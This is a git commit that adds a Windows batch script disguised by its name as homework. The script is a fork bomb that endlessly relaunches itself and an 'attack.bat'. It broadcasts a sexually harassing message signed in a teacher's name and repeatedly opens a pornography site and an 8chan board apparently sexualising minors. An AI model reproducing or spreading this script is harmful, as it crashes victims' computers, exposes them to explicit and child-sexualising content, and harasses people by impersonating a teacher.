d17009fd06569219d8726d2229db6b66f1ec7dd7
bkerr12 <49648765+bkerr12@users.noreply.github.com>
2019-04-15 12:40:29 -0500

    Create homework.bat

---
+++ homework.bat
@@ -0,0 +1,12 @@
+@echo off
+title get molested
+
+:loop
+start homework.bat
+start attack.bat
+msg * hi i was wondering if you would like to have sexual anal intercourse with me tonight? from - <teachers name>
+start weenie.png
+start https://www.pornhub.com/
+start https://8ch.net/loli/index.html
+start https://www.wildchildmagazine.us
+GOTO loop
